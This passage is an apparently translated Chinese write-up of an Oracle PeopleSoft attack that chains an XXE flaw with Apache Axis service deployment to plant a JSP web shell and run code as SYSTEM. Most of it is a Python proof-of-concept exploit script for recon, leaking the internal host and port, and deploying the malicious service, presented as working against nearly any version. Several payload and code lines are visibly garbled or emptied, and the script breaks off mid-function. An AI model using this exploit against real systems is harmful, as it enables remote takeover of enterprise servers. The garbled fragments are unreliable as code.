但我们得到的结果如下：
                test1
                test2
很明显，这并不是有效的XML代码，所以我们的请求才会被服务器拒绝。如果我们将整个Payload放到方法的参数中，比如说这样：
    GET /pspc/services/SomeService
    ?method=myMethod+attr="x">y
            y
            y
此时，我们的Payload将会出现两次，第一次的前缀为“y
            y
            y
由于我们添加了前缀“!–>”，所以第一个Payload是以“”，它表示注释结束。因此，这也就意味着我们的第一行Payload将会被忽略，而我们的Payload现在只会被解析一次。
这样一来，我们就可以将任意的SOAP请求从POST转变为GET了，这也就意味着我们可以将任何的类当作Axis服务进行部署，并利用XXE漏洞绕过服务的IP检测。
**Axis：小工具（Gadgets）**
Apache
Axis在部署服务的过程中不允许我们上传自己的Java类，因此我们只能使用服务提供给我们的类。在对PeopleSoft的pspc.war（包含Axis实例）进行了分析之后，我们发现org.apache.pluto.portalImpl包中的Deploy类包含很多非常有趣的方法。首先，addToEntityReg(String[]
args)方法允许我们在一个XML文件的结尾处添加任意数据。其次，copy(file1,
file2)方法还允许我们随意拷贝任意文件。这样一来，我们就可以向我们的XML注入一个JSP
Payload，然后将它拷贝到webroot中，这样就足以够我们拿到Shell了。
正如我们所期待的那样，PeopleSoft以SYSTEM权限运行了，而这将允许攻击者通过一个XXE漏洞触发PeopleSoft中的远程代码执行漏洞，并通过SYSTEM权限运行任意代码。
**  
**
**漏洞利用 PoC**
这种漏洞利用方法几乎适用于目前任意版本的PeopleSoft，在使用之前，请确保修改了相应的XXE终端节点：
    #!/usr/bin/python3
    # Oracle PeopleSoft SYSTEM RCE
    # https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
    # cf
    # 2017-05-17
    import requests
    import urllib.parse
    import re
    import string
    import random
    import sys
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        import colorama
    except ImportError:
        colorama = None
    else:
        colorama.init()
        COLORS = {
            '+': colorama.Fore.GREEN,
            '-': colorama.Fore.RED,
            ':': colorama.Fore.BLUE,
            '!': colorama.Fore.YELLOW
        }
    URL = sys.argv[1].rstrip('/')
    CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
    PROXY = 'localhost:8080'
    # shell.jsp?c=whoami
    PAYLOAD = ''
    class Browser:
        """Wrapper around requests.
        """
        def __init__(self, url):
            self.url = url
            self.init()
        def init(self):
            self.session = requests.Session()
            self.session.proxies = {
                'http': PROXY,
                'https': PROXY
            }
            self.session.verify = False
        def get(self, url ,*args, **kwargs):
            return self.session.get(url=self.url + url, *args, **kwargs)
        def post(self, url, *args, **kwargs):
            return self.session.post(url=self.url + url, *args, **kwargs)
        def matches(self, r, regex):
            return re.findall(regex, r.text)
    class Recon(Browser):
        """Grabs different informations about the target.
        """
        def check_all(self):
            self.site_id = None
            self.local_port = None
            self.check_version()
            self.check_site_id()
            self.check_local_infos()
        def check_version(self):
            """Grabs PeopleTools' version.
            """
            self.version = None
            r = self.get('/PSEMHUB/hub')
            m = self.matches(r, 'Registered Hosts Summary - ([0-9.]+).')
            if m:
                self.version = m[0]
                o(':', 'PTools version: %s' % self.version)
            else:
                o('-', 'Unable to find version')
        def check_site_id(self):
            """Grabs the site ID and the local port.
            """
            if self.site_id:
                return
            r = self.get('/')
            m = self.matches(r, '/([^/]+)/signon.html')
            if not m:
                raise RuntimeError('Unable to find site ID')
            self.site_id = m[0]
            o('+', 'Site ID: ' + self.site_id)
        def check_local_infos(self):
            """Uses cookies to leak hostname and local port.
            """
            if self.local_port:
                return
            r = self.get('/psp/%s/signon.html' % self.site_id)
            for c, v in self.session.cookies.items():
                if c.endswith('-PORTAL-PSJSESSIONID'):
                    self.local_host, self.local_port, *_ = c.split('-')
                    o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
                    return
            raise RuntimeError('Unable to get local hostname / port')
    class AxisDeploy(Recon):
        """Uses the XXE to install Deploy, and uses its two useful methods to get
        a shell.
        """
        def init(self):
            super().init()
            self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)
        def random_string(self, size):
            return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        def url_service(self, payload):
            return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
                self.local_port,
                urllib.parse.quote_plus(self.psoap(payload))
            )
        def war_path(self, name):
            # This is just a guess from the few PeopleSoft instances we audited.
            # It might be wrong.
            suffix = '.war' if self.version and self.version >= '8.50' else ''
            return './applications/peoplesoft/%s%s' % (name, suffix)
        def pxml(self, payload):
            """Converts an XML payload into a one-liner.
            """
            payload = payload.strip().replace('n', ' ')
            payload = re.sub('s+%s' % payload[:-1]
            return payload
        def soap_service_deploy(self):
            """SOAP payload to deploy the service.